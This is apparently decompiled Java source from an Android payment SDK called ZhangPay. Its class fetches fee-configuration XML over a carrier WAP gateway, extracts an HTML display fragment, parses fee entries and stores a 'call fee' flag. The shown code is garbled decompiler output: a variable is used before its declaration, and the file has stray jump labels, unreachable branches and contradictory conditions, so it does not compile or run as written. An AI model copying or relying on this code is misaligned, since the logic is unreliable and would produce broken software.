package com.zhangzhifu.sdk;

import android.content.Context;
import com.zhangzhifu.sdk.activity.ZhangPayActivity;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.protocolstack.ZhangPayXMLParser;
import com.zhangzhifu.sdk.util.Tools;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import java.io.InputStream;
import java.io.StringReader;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;

public class ZhangPayFeeDispath
{
  private static ZhangPayFeeDispath af;
  List K = null;
  
  private ZhangPayFeeDispath() {}
  
  public static ZhangPayFeeDispath getInstance()
  {
    if (af == null) {
      af = new ZhangPayFeeDispath();
    }
    return af;
  }
  
  public StringReader getHtml(String paramString)
  {
    try
    {
      if ((paramString.contains("<display>")) && (paramString.contains("</display>")))
      {
        String str = paramString.toString();
        com.zhangzhifu.sdk.ui.FeeView.htmlString = str.substring(str.indexOf("<display>") + "<display>".length(), str.indexOf("</display>"));
        paramString = new StringReader(paramString.substring(0, paramString.indexOf("<display>")));
        return paramString;
      }
    }
    catch (Exception paramString)
    {
      ZhangPayLog.showSaveLog("", "解析HTML错误" + paramString.getMessage());
      paramString.printStackTrace();
    }
    return null;
  }
  
  public InputStream getXML(Context paramContext)
  {
    i = 0;
    Object localObject1 = null;
    for (;;)
    {
      if (i >= 2) {}
      while (ZhangPayActivity.isBack) {
        return localObject1;
      }
      Object localObject2 = Tools.getURL(paramContext, i % 2);
      try
      {
        localObject2 = Tools.getContentByCMWAP((String)localObject2, Tools.getHeadersByDefault(paramContext, null, null), paramContext).getEntity().getContent();
        localObject1 = localObject2;
      }
      catch (Exception localException)
      {
        for (;;)
        {
          localException.printStackTrace();
          ZhangPayLog.showSaveLog("掌支付", "第" + i + "解析协议异常　" + localException.getMessage());
        }
      }
      i += 1;
    }
  }
  
  public List getXMLMessage(Context paramContext)
  {
    List localList = null;
    paramContext.getAssets();
    int j = 0;
    if (j >= 2) {}
    label15:
    while (ZhangPayActivity.isBack) {
      return localList;
    }
    Object localObject3 = Tools.getURL(paramContext, j % 2);
    Object localObject1 = localList;
    for (;;)
    {
      try
      {
        String str = Tools.getStringFromInputStream(Tools.getContentByCMWAP((String)localObject3, Tools.getHeadersByDefault(paramContext, null, null), paramContext).getEntity().getContent());
        localObject3 = localList;
        if (str == null) {
          break label324;
        }
        localObject1 = localList;
        localObject3 = localList;
        if (str.trim().equals("")) {
          break label324;
        }
        if (str != null)
        {
          localObject1 = localList;
          if (str.trim().equals(""))
          {
            break label319;
            if (i != 0) {
              break label15;
            }
            localObject1 = localList;
            localObject3 = getHtml(str);
            localObject1 = localList;
            localObject3 = new ZhangPayXMLParser().readXML((StringReader)localObject3, paramContext);
            if (localObject3 == null) {
              continue;
            }
            localObject1 = localObject3;
            if (((List)localObject3).size() <= 0) {
              continue;
            }
            localObject1 = localObject3;
            SharePreferUtil.getInstance().setIsCallFee(paramContext, 1);
            break label324;
          }
          localObject1 = localList;
          if (!str.trim().equals("1"))
          {
            localObject1 = localList;
            if (!str.trim().equals("2"))
            {
              localObject1 = localList;
              if (!str.trim().equals("3"))
              {
                localObject1 = localList;
                if (!str.trim().equals("4"))
                {
                  localObject1 = localList;
                  if (!str.trim().equals("5")) {
                    break label335;
                  }
                }
              }
            }
          }
          localObject1 = localList;
          ZhangPayActivity.errorCode = str.trim();
          i = 1;
          continue;
          localObject1 = localObject3;
          SharePreferUtil.getInstance().setIsCallFee(paramContext, 0);
        }
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
        localObject3 = localObject1;
      }
      label319:
      int i = 0;
      continue;
      label324:
      j += 1;
      Object localObject2 = localObject3;
      break;
      label335:
      i = 0;
    }
  }
  
  public void save(Context paramContext)
  {
    new HashMap().put("size", getXMLMessage(paramContext).size());
  }
}
